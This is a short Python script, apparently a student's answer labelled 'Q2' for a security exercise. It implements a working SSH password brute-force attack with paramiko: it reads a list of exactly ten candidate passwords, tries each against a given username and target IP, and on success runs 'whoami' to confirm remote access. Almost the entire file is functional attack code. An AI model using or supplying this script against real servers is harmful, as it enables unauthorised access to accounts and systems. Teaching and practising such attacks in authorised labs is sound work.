# Q2

import sys
import paramiko
from datetime import datetime

author = "Roshitha"
print(f"Author: {author}\nDate: {datetime.now().strftime('%d/%m/%Y')}\n")

# -----------------------------------------------------------------
def usage():
    print("Usage: sudo python3 ssh_bruteforce.py <target_ip> <username> <password_list.txt>")
    sys.exit(1)

# -----------------------------------------------------------------
if len(sys.argv) != 4:
    usage()

target_ip   = sys.argv[1]
username    = sys.argv[2]
pwd_file    = sys.argv[3]

# -------------------------------------------------
# Load the 10 candidate passwords (one per line)
# -------------------------------------------------
try:
    with open(pwd_file, "r") as f:
        passwords = [line.strip() for line in f if line.strip()]
except FileNotFoundError:
    print(f"[-] Password list file not found: {pwd_file}")
    sys.exit(1)

if len(passwords) != 10:
    print(f"[-] Password list must contain EXACTLY 10 lines. Found {len(passwords)}.")
    sys.exit(1)

# -------------------------------------------------
# Paramiko – try each password
# -------------------------------------------------
client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

print(f"[*] Starting brute‑force against {username}@{target_ip}")

for pwd in passwords:
    try:
        client.connect(hostname=target_ip,
                       username=username,
                       password=pwd,
                       timeout=5,
                       allow_agent=False,
                       look_for_keys=False)
    except paramiko.AuthenticationException:
        print(f"[-] Wrong password: {pwd}")
    except paramiko.SSHException as e:
        # e.g., “Error reading SSH protocol banner” – retry next password
        print(f"[!] SSH error ({e}) – trying next password")
    except Exception as e:
        print(f"[!] Unexpected error: {e}")
    else:
        print(f"[+] SUCCESS! Password is: {pwd}")
        # optional quick command to prove we have a shell
        stdin, stdout, stderr = client.exec_command('whoami')
        print(f"Remote user: {stdout.read().decode().strip()}")
        client.close()
        sys.exit(0)

print("[-] All passwords tried – login failed.")
client.close()
sys.exit(1)
